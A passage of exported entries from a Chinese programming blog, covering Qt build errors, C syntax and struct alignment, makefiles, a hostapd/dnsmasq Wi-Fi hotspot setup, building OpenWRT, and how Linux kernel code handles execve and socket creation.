PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

前置说明
  本文发布于  2015-02-09 15:37:25，现用MarkDown+图床做备份更新。blog原图已从CSDN图片服务器下载。（BlogID=012）
环境说明
  无
前言

  无




问题解决方法

  近日编译一个项目时，由于在错误状态下不小心编译一次了．当改了代码后（确认代码正确），在进行编译的时候，就会出现undefined reference to vtable for “xxx::xxx” ．
  看到这个错误，别慌，他不是一个语言级的错误，而是ｑｔ的编译机制引起的．首先，看你的程序中是不是有ｑｔ的不同于ｃ＋＋的特性（一般来说就是有没有Q_OBJECT的宏定义）．如果没有，就按照标准的Ｃ＋＋规则编译，如果有，那么那个部分就会先被生成一个.把标准的.cpp文件(并不替换原来的ｃｐｐ，而是参与编译)．然后在进行标准ｃ＋＋的编译工作．其实就是这个部分引起的错误．而这个部分也叫做元对象编译(MOC)．
  解决办法：删除build文件夹，切记删除整个文件夹．（这貌似是ｑｔ的一个ｂｕｇ，因为我全部重新编译，清除所有文件后在重新编译都是一样的错误）




后记

  无
参考文献
  无





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>C&amp;CPP</category>
      </categories>
      <tags>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title>c语言之遗漏---标准C的标记化结构初始化语法</title>
    <url>/2015/12/29/blog_idx_014/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

前置说明
  本文发布于  2015-12-29 19:22:14，现用MarkDown+图床做备份更新。blog原图已从CSDN图片服务器下载。（BlogID=014）
  日期：2015.12.29
环境说明
  无
前言

  无




说明

  在很久很久以前，我看linux内核一些代码时，我对一个东西非常的疑惑。那就是
struct XXX&#123;
void * (*xxx1)(void * a);
void * (*xxx2)(void *b);
&#125;;

struct XXX test&#123;

.xxx1=xxx11;
.xxx2=xxx22;
&#125;;

void xxx11(void *a)&#123;
&#125;
void xxx22(void *b)&#123;
&#125;
  在上面我用红字加粗的两行初始化代码，让我一直百思不得其解，我一直以为是只有linux才会有这个特殊的语法存在。
  现在，不经意间，我终于发现了此语法的出处。
  那就是：标准C的标记化结构初始化语法
  此语法来至于C99标准。
  纯手打，难免有出错之处，欢迎指正。




后记

  无
参考文献
  无





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>C&amp;CPP</category>
        <category>linux开发</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>c语言</tag>
        <tag>标准</tag>
      </tags>
  </entry>
  <entry>
    <title>linux使用hostapd+dnsmasq管理多张网卡,搭建dns服务器，并发射ｗｉｆｉ热点（支持３６０ｗｉｆｉ等等）</title>
    <url>/2015/03/03/blog_idx_013/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

前置说明
  本文发布于  2015-03-03 18:37:39，现用MarkDown+图床做备份更新。blog原图已从CSDN图片服务器下载。（BlogID=013）
  日期：２０１５．３．２
  (以下针对ｕｂｕｎｔｕ ｘ６４ １４．０４)
  下面涉及的文件，我都会上传，大家可以去慢慢研究．由于纯手工打字，有错误的地方多多包含
环境说明
  无
前言

  无




搭建方法

  首先安装软件：sudo apt-get install hostapd &amp; dnsmasq
  然后从/usr/share/doc 解压一个hostapd.conf的文件:
  改其中的这些(注意下面的选项来自于网上，主要是为了方便我编辑这篇文章，后面我会附上我现在使用的conf文件＜很长，很烦＞，请大家自行对照)：
interface=wlan0＃要开ｗｉｆｉ的网卡接口

ssid=test＃ｗｉｆｉ名称
hw_mode=g
channel=10
auth_algs=1

wpa=2

wpa_passphrase=12345678＃ｗｉｆｉ密码
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
rsn_pairwise=TKIP
  接着配置dnsmasq
  把/etc/dnsmasq.conf文件清空（担心可以先备份 :sudo cp /etc/dnsmasq.conf /etc/dnsmasq.backup.conf），添加以下的行：
interface=wlan0  #这个是你要发射ｗｉｆｉ的网卡接口名称
listen-address=192.168.0.1 #这个就是你上面设置网卡的ｉｐ（可以自行设置）
dhcp-range=192.168.0.50,192.168.0.150,12h ＃这个是ｄｈｃｐ分配的ｉｐ的范围
dhcp-option=3,192.168.0.1 ＃这个相当于网关
dhcp-option=6,8.8.8.8 ＃设置ｄｎｓ服务器．８．８．８．８是ｇｏｏｇｌｅ开放的ｄｎｓ服务器
  下面是我启动ｗｉｆｉ的ｓｈｅｌｌ文件．
#!/bin/sh

echo 1 > /proc/sys/net/ipv4/ip_forward ＃开启网络转发

iptables -A FORWARD -i wlan0 -o eth0 -s 192.168.100.0/24 -m state --state NEW -j ACCEPT
iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE  ＃开启ＮＡＴ

sudo ifconfig wlan1 192.168.0.1 netmask 255.255.255.0＃设定ｄｎｓｍａｓｑ.conf文件中网卡接口的ｉｐ地址（必须和文件中一样）

sudo /etc/init.d/dnsmasq restart ＃开启服务，或者重新开启

sudo nmcli nm wifi off
sudo rfkill unblock wlan ＃刷新ｗｉｆｉ模块状态

sudo hostapd hostapd.conf ＃启动ｈｏｓｔａｐｄ
  注意：这个ｓｈｅｌｌ文件由于最后一条命令，必须和ｈｏｓｔａｐｄ．ｃｏｎｆ在同一目录
  涉及文件下载地址：http://download.csdn.net/detail/u011728480/8469865




后记

  无
参考文献
  无





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>Ubuntu使用</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>wifi</tag>
        <tag>dns服务器</tag>
        <tag>网卡</tag>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>c语言之被遗漏的角落---#pragma pack</title>
    <url>/2016/05/15/blog_idx_016/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  前述：懒人一个，闲的无聊。上网，偶然发现一个C相关的东西（可见本人的相关文章）。在深入学习的时候，就遇到了这个#PRAGMA PACK([pop push n …])，让我不得其解。
  大家都知道，在我们写一个c的程序的时候，其实其他语言的程序一样，都是由SourceCode–&gt;目标代码–&gt;可执行文件。这中间有许多的东西（细节，默认的属性==）都被一个东西给屏蔽了--------那就是编译器与链接器。
  编译器与链接器的作用：


首先翻译


其次分析


最后生成可执行文件。


  这里由于不讲编译器的一些常见的知识，如语法树，字符流，词法语法分析==，我们讲讲我们没有关注的东西，我们程序中的变量，过程==的逻辑地址的分配问题。逻辑地址，起始地址都是由0开始的。那么我们的其他地址的逻辑地址呢？这里除了过程段的地址，还有变量的地址问题。我们今天就来看看变量地址的问题。
  据我说知，c语言对变量内存的大小划分是以int类型的大小为标准的。在32bit下，int为4bytes。这个就是一个对齐的一个很重要的参考。内存地址对齐是很重要的。优点，可以提升访问速度，降低设计难度。缺点，可能在一些情况下会浪费内存。
  在编译器中（对于32bit机器），对齐默认为4bytes，那如果你想改变这个对齐大小（至于为何会改，除了关于结构体的一些计算要用之外，由于作者水平有限，其他方面我就不知道了。）




pragma pack（）

#pragma pack（）就是来调整你的代码在编译的时候，对齐的问题。
例子：假如是16位平台,char 为一个字节，int为2字节大小。
#pragma pack(push)

#pragma pack(2)



typedef struct&#123;

char a;

int b;

&#125; test;



#pragma pack(pop)



xxx.c文件：

test mmm;

int d = &amp;mmm.a-&amp;mmm.b



求d的值，你算出来了吗？如果你有自己的想法了，那么你就对#pragma pack 有了一定的理解。




后记

  无
参考文献
  无





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>C&amp;CPP</category>
      </categories>
      <tags>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title>makefile 编写要点</title>
    <url>/2016/05/08/blog_idx_015/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  最近整理自己的文件时,发现由于太懒的原因,很多资料都来不及整理就忘掉了,很可惜,所以,在整理Makefile时,就把自己作为新手,编写makefile的一些疑问立即写下来.




编写要点



1 变量赋值


varname= 是最基本的赋值


varname:= 是覆盖之前的值


varname?= 是如果没有被赋值过就赋予等号后面的值


varname+= 是添加等号后面的值




2 几个特殊符号的意义


$@–目标文件，


$^–所有的依赖文件，


$&lt;–第一个依赖文件。




3 多目录makefile编写要点


用命令: ${MAKE} -C ${子目录} ${TARGETNAME}


注释:以上命令会切换到子目录,并执行make命令


在子目录建立makefile,做好依赖工作




4 makefile部分函数使用


patsubst(&lt;pattern&gt;,&lt;replacement&gt;,&lt;text&gt;)
功能：查找&lt;text&gt;中的单词（单词以“空格”、“Tab”或“回车”“换行”分隔）是否符合模式&lt;pattern&gt;，如果匹配的话，则以&lt;replacement&gt;替换。这里，&lt;pattern&gt;可以包括通配符“%”，表示任意长度的字串。如果&lt;replacement&gt;中也包含“%”，那么，&lt;replacement&gt;中的这个“%”将是&lt;pattern&gt;中的那个“%”所代表的字串。（可以用“\”来转义，以“%”来表示真实含义的“%”字符）
返回：函数返回被替换过后的字符串。


示例：
$(patsubst %.c,%.o,tmp.c.c tmp1.c)
把字串“tmp.c.c tmp1.c”符合模式[%.c]的单词替换成[%.o]，返回结果是“tmp.c.o tmp1.o”


$(strip &lt;string&gt; )
功能：去掉&lt;string&gt;字串中开头和结尾的空字符。 
返回：返回被去掉空格的字符串值。


示例：
$(strip abc )
把字串“ abc ”去到开头和结尾的空格，结果是“abc”。


${wildcard &lt;partner&gt;)
功能：src = $(wildcard *.c )
返回:搜索当前目录下所有以.c结尾的文件，生成一个以空格间隔的文件名列表，并赋值给SRC.当前目录文件只有文件名，子目录下的文件名包含路径信息


${notdir textlist)
使用：src = $(notdir textlist)
返回:去除所有的目录信息，SRC里的文件名列表将只有文件名。






我的makefile实例

我的makefile实例:

topdir-makefile:

##############################
# file:   Makefile
# author:  sky
# modified-date:  2016-05-07
###############################
export ROOT_DIR := $(shell pwd)  
#get out of start and end char' ' of the string
ROOT_DIR :=$(strip $&#123;ROOT_DIR&#125;)
export LIB_DIR:=$(ROOT_DIR)/lib
export SRC_DIR:=$(ROOT_DIR)/src
export INCLUDE_DIR:=$(ROOT_DIR)/include
export TARGET:=test
export CC:=gcc
export LD_FLAGS:=-l config -pthread
export SRC:=$(wildcard $&#123;SRC_DIR&#125;/*.c)
export OBJ:=$(patsubst %.c,%.o,$&#123;SRC&#125;)
export OBJ_S:=Y_Start.o Y_ChildProcess.o 
#if you want to build release-program , use command: make BUILD_RELEASE=TRUE
ifeq ($(BUILD_RELEASE), TRUE)
export C_FLAGS:= -I $&#123;INCLUDE_DIR&#125; -std=c99 
export BUILD_DIR := $(ROOT_DIR)/release  
else
export C_FLAGS:= -g -D Y_DEBUG -I $&#123;INCLUDE_DIR&#125; -std=c99  
export BUILD_DIR := $(ROOT_DIR)/debug
endif
export OLD_OBJ:=$(wildcard $&#123;BUILD_DIR&#125;/*.o)
.PHONY :default all clean 
default:all 
all :
@$&#123;MAKE&#125; -C src all
clean: 
@$&#123;MAKE&#125; -C src clean
sub-dir-makefile:



.PHONY:all clean  
all:$&#123;TARGET&#125;
@$&#123;CC&#125;  $&#123;OBJ&#125; -o $&#123;TARGET&#125; $&#123;LD_FLAGS&#125;
@mv $&#123;TARGET&#125; $&#123;BUILD_DIR&#125;
@mv $&#123;OBJ&#125; $&#123;BUILD_DIR&#125;
#this is to make test from a static-lib
test_static:$&#123;OBJ&#125;
@$&#123;CC&#125; $&#123;C_FLAGS&#125; $&#123;OBJ_S&#125; -o test_static -static -L $&#123;LIB_DIR&#125; -l Y_Stdio
#this is to make test from a shared-lib
test_share:$&#123;OBJ&#125;
@$&#123;CC&#125; $&#123;C_FLAGS&#125; $&#123;OBJ_S&#125; -o test_share -L $&#123;LIB_DIR&#125; -l Y_Stdio
#this is to make a static-lib
libY_Stdio_Static:
@$&#123;CC&#125; $&#123;C_FLAGS&#125; -c Y_Stdio.c
@ar -rcs libY_Stdio.a Y_Stdio.o
@mv libY_Stdio.a $&#123;LIB_DIR&#125;
#this is to make a shared-lib
libY_Stdio_Shared:
@$&#123;CC&#125; $&#123;C_FLAGS&#125; -fPIC -c Y_Stdio.c
@$&#123;CC&#125; -shared -fPIC -o libY_Stdio.so Y_Stdio.o
@mv libY_Stdio.so $&#123;LIB_DIR&#125;
$&#123;TARGET&#125;:
@$&#123;CC&#125; $&#123;C_FLAGS&#125; -c $&#123;SRC&#125;
#clean target
clean:
@rm  $&#123;OLD_OBJ&#125; $&#123;BUILD_DIR&#125;/$&#123;TARGET&#125;


纯手打，难免有出错之处，欢迎指正。




后记

  无。
参考文献
  无。





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>C&amp;CPP</category>
        <category>linux开发</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>c语言</tag>
        <tag>makefile</tag>
      </tags>
  </entry>
  <entry>
    <title>C程序问题归纳(static,auto,register,extern,程序内存分布图，linux下程序的执行过程......)(一)</title>
    <url>/2016/05/31/blog_idx_018/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  近段时间看一些代码，自己也写了一些。但是写着写着感觉自己迷茫了，自己对程序的结构越来越模糊，甚至都不相信自己的写的部分，或者相信自己的知识。那么现在就来终结这些想法，让自己提升一下。本系列文章主要分为两部分，（一）是分析程序在内存中的分布（二）是linux下程序的执行流程
  注释：现在PC平台流行的可执行文件格式(Executable)主要是Windows下的PE(Portable Executable)和linux下的ELF(Executable Linkable Format)，他们都是COFF(Common file format)的变种。




分析

  下面是程序在内存中的分布:
一般具有一个完整内存分布的程序大概有以下几部分。

－－－－－－－－－－－－－－－－－－

CODE/TEXT SEGMENT ---存放程序中的机器指令（过程）

－－－－－－－－－－－－－－－－－－

RO DATA SEGMENT---存放只读数据（在程序执行过程中不会改变但是有用的数据），如const常量（局部与全局）等等

－－－－－－－－－－－－－－－－－－

RW DATA SEGMENT---存放读写数据(在程序执行过程中，会改变的数据)，如static 修饰的变量(全局与局部)，初始化全局变量等等

－－－－－－－－－－－－－－－－－－

BSS SEGMENT---未初始化数据段，存放未初始化变量的声明

－－－－－－－－－－－－－－－－－－

HEAP SEGMENT---堆，malloc/realloc等等。。。

－－－－－－－－－－－－－－－－－－

STACT SEGMENT---栈，函数内部普通变量，现场保护信息等等

－－－－－－－－－－－－－－－－－－
小提示：

code/text ,rw/ro data,bss属于静态区（如：static修饰，全局变量（默认为extern修饰）），而heap,stack属于动态区（如：局部普通变量（默认auto修饰，可选为register））



实例
  注意：test.c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

const char g_ro[] &#x3D; &#123;&quot;save to ro data segment&quot;&#125;;
static char g_rw[] &#x3D; &#123;&quot;save to rw data segment&quot;&#125;;
int g_bss[100];&#x2F;&#x2F;save to bss segment


int main(int argc, char *argv[])&#123;

	int l_stack;&#x2F;&#x2F;stack 4bytes
	char l_stack_1[100];&#x2F;&#x2F;stack 100bytes
	char * l_stack_2 &#x3D; &quot;this string save to ro data segment,but l_stack_2 save to stack(4bytes)&quot;;
	char * l_stack_3;&#x2F;&#x2F;l_stack_3 save to stack(4bytes)
	char  l_stack_4[] &#x3D; &#123;&quot;this string save to ro data segment,but l_stack_4 save to stack(4bytes)&quot;&#125;;

	static char l_rw[] &#x3D; &#123;&quot;save to rw data segment&quot;&#125;;
	static char l_bss[100];&#x2F;&#x2F;save to bss segment
	static int l_rw_1 &#x3D; 1;&#x2F;&#x2F;save to rw data segment

	char * m_p &#x3D; (char *) malloc(100*sizeof(char));&#x2F;&#x2F;save to heap
	free(m_p);
	
	return 0;
&#125;

  通过以下图片，验证变量g_rw,g_ro是否在ro/rw data segment
  首先，确定ro data segment ／　rw data segment 起始地址
  在符号表中：

    
        
    
    

    
        
    
    
  符号表中关于g_rw和g_ro的描述：

    
        
    
    

    
        
    
    
  调入到gdb中调试显示：

    
        
    
    
  同理，可以继续分析其他变量。
  注意：符号表使用readelf -a elf_file_name读取




后记

  无
参考文献
  无





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>C&amp;CPP</category>
        <category>linux开发</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title>编译OpenWRT-for-MT7620A(带8021x验证)</title>
    <url>/2016/05/31/blog_idx_017/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  无




编译Openwrt



第一步，使用git clone 下载openwrt-sourcecode.


git clone git@github.com:openwrt-mirror/openwrt.git


第二步，复制feeds.conf.default 到　feeds.conf,并修改你想要的包。


如我添加了8021x的认证包。

    
        
    
  


第三步，更新需要的包，并安装（使用feeds脚本）


./scripts/feeds update -a
./scripts/feeds install -a


第四步，选择自自己的MCU-target(类似linux kernel 配置)


make menuconfig


为选择MCU系列


为选择MCU-Board



    
        
    
  


在network中，选择加入的8021x认证包



    
        
    
 


如果你有其他的配置，请自行根据需要选择。


退出保存.config




第五步，编译（make）


注意Ｎ为你计算机的cpu虚拟核数
make -j N 




编译中的问题

  注意在编译中会出一部分错误，大概是两类。​


一为：缺少依赖，下面可以解决
解决办法：


sudo apt-get install gcc g++ binutils patch bzip2 flex bison make autoconf gettext texinfo unzip sharutils subversion libncurses5-dev ncurses-term zlib1g-dev


二为：自己添加包编译问题
解决办法：
去看你添加包的readme.md和google






编译输出

  下面说说编译完了，有些什么东西，而我们要的在哪里？下图是编译完后，openwrt目录的变化，​

    
        
    
 
  下图是我们需要的openwrt固件,在bin/xxx/目录下

    
        
    
 
  在bin/xxx/packages下，是所有的编译出来的ipk包。如下图我的8021x包的ipk包

    
        
    
 
  在staging_dir下，是这个平台的lib,include文件，同时还有这个平台的交叉编译工具
  最后，特别声明，刷机有风险，请各位谨慎。如果刷机出现任何问题，我不负任何责任（多查查资料多问问人）




后记

  无
参考文献
  无





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
        <category>常识</category>
      </categories>
      <tags>
        <tag>OpenWRT</tag>
        <tag>8021x</tag>
        <tag>路由器</tag>
      </tags>
  </entry>
  <entry>
    <title>C程序问题归纳(static,auto,register,extern,程序内存分布图，linux下程序的执行过程......)(二)</title>
    <url>/2016/06/02/blog_idx_019/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  近段时间看一些代码，自己也写了一些。但是写着写着感觉自己迷茫了，自己对程序的结构越来越模糊，甚至都不相信自己的写的部分，或者相信自己的知识。那么现在就来终结这些想法，让自己提升一下。本系列文章主要分为两部分，（一）是分析程序在内存中的分布（二）是linux下程序的执行流程




linux下程序的执行流程

  对Linux有了解的人都应该知道，在系统中只有一个pid为１的父进程(init)，其他的进程都是这个进程衍生出来的子进程(fork)，从而形成了以init为树根的一颗树。如图：

    
        
    
    
  如果你有图形桌面，则会在初始化好了开机启动服务后，会调用图形桌面启动器lightdm,然后图形界面初始化，然后你双击鼠标运行的程序就会是图形桌面的子进程。而我们在shell下运行的程序就会是在lightdm-&gt;/usr/bin/x-term(以上图为例)下形成子进程。
  当你在shell中输入
./XXXXX
这个时候，一个程序就开始执行了。现在就进入我们这篇文章要讲的重点。（一个程序要可以执行的前戏就是之前的分析）


现在我要开始执行ＸＸＸＸＸ程序
  在shell中输入上图命令，并回车后。


第一步：shell 会fork 出一个子进程。同时wait()子进程结束。如果在shell命令后加入&amp;等符号，表示后台执行时，shell　fork后，不会wait()子进程，而直接返回。新fork（）出的子进程，将会调用一个用户态函数execve()　加载ｘｘｘｘｘ程序的文件。（放在磁盘上的静态数据）


第二步：下面来分析execve()函数的执行过程。查看man手册：



    
        
    
    
execve源码:

    
        
    
    
在调用INLINE_SYSCALL宏后，

    
        
    
    
调用INTERNAL_SYSCALL()

    
        
    
    
(提示：其实以上部分就是熟知的ＧＬＩＢＣ怎么实现用户ＡＰＩ与系统调用结合的过程)
保存系统调用号，然后保存到寄存器，然后切换到内核态，根据调用号查询到sys_execve()，执行sys_execve()
asmlinkage int sys_execve(struct pt_regs regs)  
&#123;  
    int error;  
    char * filename;  
  
    filename = getname((char *) regs.ebx);
    error = PTR_ERR(filename);  
    if (IS_ERR(filename))  
        goto out;  
    error = do_execve(filename, (char **) regs.ecx, (char **) regs.edx, &amp;regs);  
    if (error == 0)  
        current->ptrace &amp;= ~PT_DTRACE;  
    putname(filename);  
out:  
    return error;  
&#125;  
调用do_execve()，先收集信息，调用search_binary_handler()函数，根据可执行文件类型，调用不同的的处理函数去执行。（后面详细的信息可以去阅读源码，这里就不一一说明）
（由于本人水平有限，后面部分只知道个大概，就不献丑了）
这样一个程序就执行起来了。是不是非常的简单。




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>C&amp;CPP</category>
        <category>linux开发</category>
        <category>常识</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux socket 摘要(一)</title>
    <url>/2016/07/04/blog_idx_022/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  注意：Linux 一切皆文件




Linux 网络分层


    
        
    
    
注：Linux 网络分层，图片来自于百度图片


Linux 一个socket程序的执行流（结果就是得到一个fd,让我们能够通过fd去操作socket所创建的一个文件对象）
在用户态下：某程序执行socket(int af, int type, int protocol)
经过系统调用层的实现
在内核态下：会跳转到内核态执行sys_socket(),下面看其源码
SYSCALL_DEFINE3(socket, int, family, int, type, int, protocol)
&#123;
	int retval;
	struct socket *sock;
	int flags;

	/* Check the SOCK_* constants for consistency.  */
	BUILD_BUG_ON(SOCK_CLOEXEC != O_CLOEXEC);
	BUILD_BUG_ON((SOCK_MAX | SOCK_TYPE_MASK) != SOCK_TYPE_MASK);
	BUILD_BUG_ON(SOCK_CLOEXEC &amp; SOCK_TYPE_MASK);
	BUILD_BUG_ON(SOCK_NONBLOCK &amp; SOCK_TYPE_MASK);

	flags = type &amp; ~SOCK_TYPE_MASK;
	if (flags &amp; ~(SOCK_CLOEXEC | SOCK_NONBLOCK))
		return -EINVAL;
	type &amp;= SOCK_TYPE_MASK;

	if (SOCK_NONBLOCK != O_NONBLOCK &amp;&amp; (flags &amp; SOCK_NONBLOCK))
		flags = (flags &amp; ~SOCK_NONBLOCK) | O_NONBLOCK;

	retval = sock_create(family, type, protocol, &amp;sock);
	if (retval &lt; 0)
		goto out;

	retval = sock_map_fd(sock, flags &amp; (O_CLOEXEC | O_NONBLOCK));
	if (retval &lt; 0)
		goto out_release;

out:
	/* It may be already another descriptor 8) Not kernel problem. */
	return retval;

out_release:
	sock_release(sock);
	return retval;
&#125;
这里我们注意:函数里面执行了两个函数来完成socket的功能


sock_create()//创建一个socket


sock_map_fd()//获得一个标号，并返回这个fd


sock_create()源代码:
static int inet_create(struct net *net, struct socket *sock, int protocol)
&#123;
	struct sock *sk;
	struct inet_protosw *answer;
	struct inet_sock *inet;
	struct proto *answer_prot;
	unsigned char answer_flags;
	char answer_no_check;
	int try_loading_module = 0;
	int err;

	if (unlikely(!inet_ehash_secret))
		if (sock->type != SOCK_RAW &amp;&amp; sock->type != SOCK_DGRAM)
			build_ehash_secret();

	sock->state = SS_UNCONNECTED;

	/* Look for the requested type/protocol pair. */
lookup_protocol:
	err = -ESOCKTNOSUPPORT;
	rcu_read_lock();

	list_for_each_entry_rcu(answer, &amp;inetsw[sock->type], list) &#123;

		err = 0;
		/* Check the non-wild match. */
		if (protocol == answer->protocol) &#123;
			if (protocol != IPPROTO_IP)
				break;
		&#125; else &#123;
			/* Check for the two wild cases. */
			if (IPPROTO_IP == protocol) &#123;
				protocol = answer->protocol;
				break;
			&#125;
			if (IPPROTO_IP == answer->protocol)
				break;
		&#125;
		err = -EPROTONOSUPPORT;
	&#125;

	if (unlikely(err)) &#123;
		if (try_loading_module &lt; 2) &#123;
			rcu_read_unlock();
			/*
			 * Be more specific, e.g. net-pf-2-proto-132-type-1
			 * (net-pf-PF_INET-proto-IPPROTO_SCTP-type-SOCK_STREAM)
			 */
			if (++try_loading_module == 1)
				request_module("net-pf-%d-proto-%d-type-%d",
					       PF_INET, protocol, sock->type);
			/*
			 * Fall back to generic, e.g. net-pf-2-proto-132
			 * (net-pf-PF_INET-proto-IPPROTO_SCTP)
			 */
			else
				request_module("net-pf-%d-proto-%d",
					       PF_INET, protocol);
			goto lookup_protocol;
		&#125; else
			goto out_rcu_unlock;
	&#125;

	err = -EPERM;

	if (answer->capability > 0 &amp;&amp; !capable(answer->capability))
		goto out_rcu_unlock;

	err = -EAFNOSUPPORT;

	if (!inet_netns_ok(net, protocol))
		goto out_rcu_unlock;

	sock->ops = answer->ops;
	
	answer_prot = answer->prot;
	answer_no_check = answer->no_check;
	answer_flags = answer->flags;
	rcu_read_unlock();

	WARN_ON(answer_prot->slab == NULL);

	err = -ENOBUFS;

	sk = sk_alloc(net, PF_INET, GFP_KERNEL, answer_prot);
	if (sk == NULL)
		goto out;

	err = 0;

	sk->sk_no_check = answer_no_check;
	if (INET_PROTOSW_REUSE &amp; answer_flags)
		sk->sk_reuse = 1;

	inet = inet_sk(sk);

	inet->is_icsk = (INET_PROTOSW_ICSK &amp; answer_flags) != 0;

	if (SOCK_RAW == sock->type) &#123;
		inet->num = protocol;
		if (IPPROTO_RAW == protocol)
			inet->hdrincl = 1;
	&#125;

	if (ipv4_config.no_pmtu_disc)
		inet->pmtudisc = IP_PMTUDISC_DONT;
	else
		inet->pmtudisc = IP_PMTUDISC_WANT;

	inet->id = 0;

	sock_init_data(sock, sk);

	sk->sk_destruct	   = inet_sock_destruct;
	sk->sk_protocol	   = protocol;

	sk->sk_backlog_rcv = sk->sk_prot->backlog_rcv;

	inet->uc_ttl	= -1;
	inet->mc_loop	= 1;
	inet->mc_ttl	= 1;
	inet->mc_all	= 1;
	inet->mc_index	= 0;
	inet->mc_list	= NULL;

	sk_refcnt_debug_inc(sk);

	if (inet->num) &#123;
		/* It assumes that any protocol which allows
		 * the user to assign a number at socket
		 * creation time automatically
		 * shares.
		 */
		inet->sport = htons(inet->num);
		/* Add to protocol hash chains. */
		sk->sk_prot->hash(sk);
	&#125;

	if (sk->sk_prot->init) &#123;

		err = sk->sk_prot->init(sk);
		if (err)
			sk_common_release(sk);
	&#125;
out:
	return err;
out_rcu_unlock:
	rcu_read_unlock();
	goto out;
&#125;



static const struct net_proto_family inet_family_ops = &#123;  
    .family = PF_INET,  
    .create = inet_create,  
    .owner  = THIS_MODULE,  
&#125;;  
这里我们只注意:


sock_alloc()//创建一个inode(给文件系统管理)，创建一个socket()对象


pf-&gt;create()//若是tcp，则是inet_family_ops中create的值


sock_map_fd()的执行：


sock_alloc_fd()//获得一个可用的fd


sock_attach_fd()//把fd,file结构体，socket实例连接起来


fd_install()//fd添加到pcb






后记

对流程的整理：
socket()


sys_socket()


sock_create()//创建一个socket


sock_alloc()//创建一个inode(给文件系统管理)，创建一个socket()对象


pf-&gt;create()//若是tcp，则是inet_family_ops中create的值


sock_map_fd()//获得一个标号，并返回这个fd


参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>C&amp;CPP</category>
        <category>linux开发</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>网络</tag>
